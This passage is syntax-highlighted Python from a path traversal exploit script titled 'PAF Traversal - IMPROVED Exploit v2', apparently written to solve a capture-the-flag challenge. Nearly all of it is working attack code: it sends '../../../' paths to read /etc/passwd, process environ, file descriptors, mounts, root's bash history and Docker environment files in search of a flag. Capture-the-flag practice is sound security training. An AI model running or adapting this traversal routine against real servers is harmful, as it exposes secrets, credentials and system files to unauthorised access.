</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=n>matches</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_proc_fd</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>pid</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>max_fd</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>20</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Check /proc/[pid]/fd/[num] for open file descriptors&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Checking /proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/fd/ (0-</span><span class=si>{</span><span class=n>max_fd</span><span class=si>}</span><span class=s2>)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>fd</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>max_fd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=c1># Try reading the symlink target via /proc/[pid]/fd/[num]</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../../proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/fd/</span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># Check if it contains flag content</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>content</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;HERO&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=s2>&#34;Hero{&#34;</span> <span class=ow>in</span> <span class=n>content</span> <span class=ow>or</span> <span class=s2>&#34;hero{&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] FOUND FLAG in /proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/fd/</span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2>!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>content</span>
</span></span><span class=line><span class=cl>                <span class=c1># Print what we found</span>
</span></span><span class=line><span class=cl>                <span class=n>preview</span> <span class=o>=</span> <span class=n>content</span><span class=p>[:</span><span class=mi>100</span><span class=p>]</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=s1>&#39;</span><span class=se>\\</span><span class=s1>n&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [&gt;] fd </span><span class=si>{</span><span class=n>fd</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>preview</span><span class=si>}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>check_proc_cwd</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>pid</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=n>List</span><span class=p>[</span><span class=nb>str</span><span class=p>]]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Check /proc/[pid]/cwd to see working directory&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=c1># We can&#39;t list directories directly, but we can try common filenames</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Trying to read files in /proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/cwd/...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Try reading common files that might exist</span>
</span></span><span class=line><span class=cl>        <span class=n>test_files</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;entrypoint.sh&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;api&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;cracker&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;.dockerenv&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>filename</span> <span class=ow>in</span> <span class=n>test_files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../../proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/cwd/</span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [+] Found: </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;flag_&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>matches</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;flag_([0-9a-f]</span><span class=si>{8}</span><span class=s1>)\.txt&#39;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>matches</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=k>return</span> <span class=n>matches</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>try_ls_via_bash_history</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Try to find bash history that might contain ls commands&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Checking for bash history files...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>history_paths</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../../root/.bash_history&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../../home/app/.bash_history&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../../app/.bash_history&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>path</span> <span class=ow>in</span> <span class=n>history_paths</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>content</span> <span class=ow>and</span> <span class=s2>&#34;flag_&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Found flag reference in </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>matches</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;flag_([0-9a-f]</span><span class=si>{8}</span><span class=s1>)\.txt&#39;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>matches</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>matches</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>try_docker_env</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Try reading Docker environment files&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Checking Docker environment...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>docker_files</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../../proc/1/environ&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../../proc/self/environ&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../../.dockerenv&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>path</span> <span class=ow>in</span> <span class=n>docker_files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;FLAG&#34;</span> <span class=ow>in</span> <span class=n>content</span> <span class=ow>or</span> <span class=s2>&#34;flag_&#34;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Found potential flag in </span><span class=si>{</span><span class=n>path</span><span class=si>}</span><span class=s2>!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>env_vars</span> <span class=o>=</span> <span class=n>content</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=n>var</span> <span class=ow>in</span> <span class=n>env_vars</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    </span><span class=si>{</span><span class=n>var</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=s1>&#39;FLAG=&#39;</span> <span class=ow>in</span> <span class=n>var</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>return</span> <span class=n>var</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;FLAG=&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                        <span class=n>matches</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;flag_([0-9a-f]</span><span class=si>{8}</span><span class=s1>)\.txt&#39;</span><span class=p>,</span> <span class=n>var</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>matches</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                            <span class=k>return</span> <span class=n>matches</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>try_proc_self_status</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Read /proc/self/status for info&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Reading /proc/self/status...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=s2>&#34;../../../proc/self/status&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># Look for working directory or other clues</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>content</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s1>&#39;Name&#39;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>or</span> <span class=s1>&#39;Pid&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>line</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_proc_mounts</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Check /proc/mounts for mounted filesystems&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Reading /proc/mounts...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=s2>&#34;../../../proc/mounts&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>content</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s1>&#39;/app&#39;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>or</span> <span class=s1>&#39;flag&#39;</span> <span class=ow>in</span> <span class=n>line</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  </span><span class=si>{</span><span class=n>line</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>try_glob_via_shell_expansion</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>        Try to trigger shell expansion somehow
</span></span></span><span class=line><span class=cl><span class=s2>        This likely won&#39;t work as Go doesn&#39;t use shell for file ops
</span></span></span><span class=line><span class=cl><span class=s2>        &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Attempting shell glob patterns (unlikely to work)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>patterns</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../flag_[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f].txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../flag_*.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;../../flag_????????.txt&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>pattern</span> <span class=ow>in</span> <span class=n>patterns</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=n>pattern</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>content</span> <span class=ow>and</span> <span class=n>content</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;HERO&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Pattern worked: </span><span class=si>{</span><span class=n>pattern</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>content</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;  [-] As expected, glob patterns don&#39;t work with Go&#39;s os.Open()&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>systematic_proc_enumeration</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Systematically enumerate /proc to find flag filename&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;SYSTEMATIC /proc ENUMERATION&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 1: Find active PIDs</span>
</span></span><span class=line><span class=cl>        <span class=n>pids</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>enumerate_proc_pids</span><span class=p>(</span><span class=n>max_pid</span><span class=o>=</span><span class=mi>50</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[*] Found </span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>pids</span><span class=p>)</span><span class=si>}</span><span class=s2> active processes</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Step 2: Check each PID for clues</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=n>pids</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>--- Examining PID </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2> ---&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Check environ</span>
</span></span><span class=line><span class=cl>            <span class=n>hex_val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>check_proc_environ</span><span class=p>(</span><span class=n>pid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>hex_val</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>hex_val</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Check maps</span>
</span></span><span class=line><span class=cl>            <span class=n>hex_val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>check_proc_maps</span><span class=p>(</span><span class=n>pid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>hex_val</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>hex_val</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Check open file descriptors</span>
</span></span><span class=line><span class=cl>            <span class=n>flag_content</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>check_proc_fd</span><span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=n>max_fd</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>flag_content</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FOUND FLAG: </span><span class=si>{</span><span class=n>flag_content</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>flag_content</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># Check cwd</span>
</span></span><span class=line><span class=cl>            <span class=n>matches</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>check_proc_cwd</span><span class=p>(</span><span class=n>pid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>matches</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>matches</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Main exploit routine&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;PAF Traversal - IMPROVED Exploit v2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Verify vulnerability</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Verifying path traversal vulnerability...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>passwd</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=s2>&#34;../../../etc/passwd&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>passwd</span> <span class=ow>and</span> <span class=s2>&#34;root:&#34;</span> <span class=ow>in</span> <span class=n>passwd</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Path traversal confirmed!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Path traversal test failed!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Try Docker environment first (quick check)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>try_docker_env</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;HERO&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FLAG FOUND: </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># It&#39;s a hex value, read the file</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../flag_</span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FLAG FOUND: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Try bash history</span>
</span></span><span class=line><span class=cl>        <span class=n>hex_val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>try_ls_via_bash_history</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>hex_val</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>download_file</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;../../flag_</span><span class=si>{</span><span class=n>hex_val</span><span class=si>}</span><span class=s2>.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FLAG FOUND: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># Try glob patterns (unlikely)</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>try_glob_via_shell_expansion</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] FLAG FOUND: </span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
